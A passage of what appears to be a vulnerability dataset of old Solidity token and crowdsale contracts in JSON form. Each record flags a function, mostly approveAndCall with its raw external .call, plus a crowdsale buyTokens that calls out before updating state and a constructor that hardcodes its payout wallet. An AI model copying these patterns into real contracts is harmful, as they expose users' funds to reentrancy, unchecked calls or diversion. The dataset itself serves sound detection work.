    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb147d"
  },
  "filename": "31607.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000000000;\n totalSupply = 100000000000000000000000;\n name = \"NecronomiCoin\";\n decimals = 18;\n symbol = \"NCRO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb147e"
  },
  "filename": "31608.sol",
  "content": "pragma solidity ^0.4.4;\n contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n }\n contract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n }\n contract EducationalDollarUtility is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EducationalDollarUtility(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Scholars Educational Dollar Utility\";\n decimals = 18;\n symbol = \"EDU\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n }",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb147f"
  },
  "filename": "31619.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000000000;\n totalSupply = 100000000000000000000000;\n name = \"CthulhuCoin\";\n decimals = 18;\n symbol = \"RLYH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1480"
  },
  "filename": "31634.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public oldOwner;\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier onlyOldOwner() {\n require(msg.sender == oldOwner || msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n oldOwner = owner;\n owner = newOwner;\n }\n function backToOldOwner() onlyOldOwner public {\n require(oldOwner != address(0));\n owner = oldOwner;\n }\n}\n contract Crowdsale {\n using SafeMath for uint256;\n uint256 public startTime;\n uint256 public endTime;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {\n require(_startTime >= now);\n require(_endTime >= _startTime);\n require(_rate > 0);\n require(_wallet != 0x0);\n startTime = _startTime;\n endTime = _endTime;\n rate = _rate;\n wallet = 0x00B95A5D838F02b12B75BE562aBF7Ee0100410922b;\n }\n function validPurchase() internal constant returns (bool) {\n bool withinPeriod = now >= startTime && now <= endTime;\n bool nonZeroPurchase = msg.value != 0;\n return withinPeriod && nonZeroPurchase;\n }\n function hasEnded() public constant returns (bool) {\n return now > endTime;\n }\n}\n contract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n function CappedCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, uint256 _cap) public\n Crowdsale(_startTime, _endTime, _rate, _wallet)\n {\n require(_cap > 0);\n cap = _cap;\n }\n function validPurchase() internal constant returns (bool) {\n bool withinCap = weiRaised.add(msg.value) <= cap;\n return super.validPurchase() && withinCap;\n }\n function hasEnded() public constant returns (bool) {\n bool capReached = weiRaised >= cap;\n return super.hasEnded() || capReached;\n }\n}\ncontract HeartBoutPreICO is CappedCrowdsale, Ownable {\n using SafeMath for uint256;\n address public token;\n uint256 public minCount;\n mapping(string => address) bindAccountsAddress;\n mapping(address => string) bindAddressAccounts;\n string[] accounts;\n event GetBindTokensAccountEvent(address _address, string _account);\n function HeartBoutPreICO(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, uint256 _cap, uint256 _minCount) public\n CappedCrowdsale(_startTime, _endTime, _rate, _wallet, _cap)\n {\n token = 0x00305cB299cc82a8A74f8da00AFA6453741d9a15Ed;\n minCount = _minCount;\n }\n function () payable public {\n }\n function buyTokens(string _account) public payable {\n require(!stringEqual(_account, \"\"));\n require(validPurchase());\n require(msg.value >= minCount);\n if(!stringEqual(bindAddressAccounts[msg.sender], \"\")) {\n require(stringEqual(bindAddressAccounts[msg.sender], _account));\n }\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(rate);\n require(token.call(bytes4(keccak256(\"mint(address,uint256)\")), msg.sender, tokens));\n bindAccountsAddress[_account] = msg.sender;\n bindAddressAccounts[msg.sender] = _account;\n accounts.push(_account);\n weiRaised = weiRaised.add(weiAmount);\n forwardFunds();\n }\n function getEachBindAddressAccount() onlyOwner public {\n for (uint i = 0; i < accounts.length; i++) {\n GetBindTokensAccountEvent(bindAccountsAddress[accounts[i]], accounts[i]);\n }\n }\n function getBindAccountAddress(string _account) public constant returns (address) {\n return bindAccountsAddress[_account];\n }\n function getBindAddressAccount(address _accountAddress) public constant returns (string) {\n return bindAddressAccounts[_accountAddress];\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n function stringEqual(string _a, string _b) internal pure returns (bool) {\n return keccak256(_a) == keccak256(_b);\n }\n function changeWallet(address _wallet) onlyOwner public {\n wallet = _wallet;\n }\n function removeContract() onlyOwner public {\n selfdestruct(wallet);\n }\n}",
  "extract_feature": [
    "function buyTokens(string _account) public payable {\nrequire(!stringEqual(_account, \"\"));\nrequire(validPurchase());\nrequire(msg.value >= minCount);\nif(!stringEqual(bindAddressAccounts[msg.sender], \"\")) {\nrequire(stringEqual(bindAddressAccounts[msg.sender], _account));\n}\nuint256 weiAmount = msg.value;\nuint256 tokens = weiAmount.mul(rate);\nrequire(token.call(bytes4(keccak256(\"mint(address,uint256)\")), msg.sender, tokens));\nbindAccountsAddress[_account] = msg.sender;\nbindAddressAccounts[msg.sender] = _account;\naccounts.push(_account);\nweiRaised = weiRaised.add(weiAmount);\nforwardFunds();\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1481"
  },
  "filename": "31642.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Trillion is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Trillion(\n ) {\n balances[msg.sender] = 1000000000000;\n totalSupply = 1000000000000;\n name = \"Trillion\";\n decimals = 0;\n symbol = \"TRL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1482"
  },
  "filename": "31652.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"ESCOBAR\";\n decimals = 18;\n symbol = \"ESCOBAR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1483"
  },
  "filename": "31670.sol",
  "content": "pragma solidity ^0.4.15;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n function burnToken(uint256 _value) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed burner, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken is Token, Ownable {\n using SafeMath for uint256;\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function burnToken(uint256 _value) onlyOwner{\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DatoxToken is StandardToken {\n function () {\n throw;\n }\n string public constant name = \"DATOX\";\n string public constant symbol = \"DTX\";\n uint8 public constant decimals = 8;\n uint256 public constant INITIAL_SUPPLY = 200000000 * (10 ** uint256(decimals));\n function DatoxToken() {\n balances[msg.sender] = INITIAL_SUPPLY;\n totalSupply = INITIAL_SUPPLY;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1484"
  },
  "filename": "31690.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) view public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n view public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1485"
  },
  "filename": "31691.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract GhostGold is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function GhostGold(\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"GhostGold\";\n decimals = 0;\n symbol = \"GXG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1486"
  },
  "filename": "31694.sol",
  "content": "pragma solidity 0.4.19;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) view public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender)\n view public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
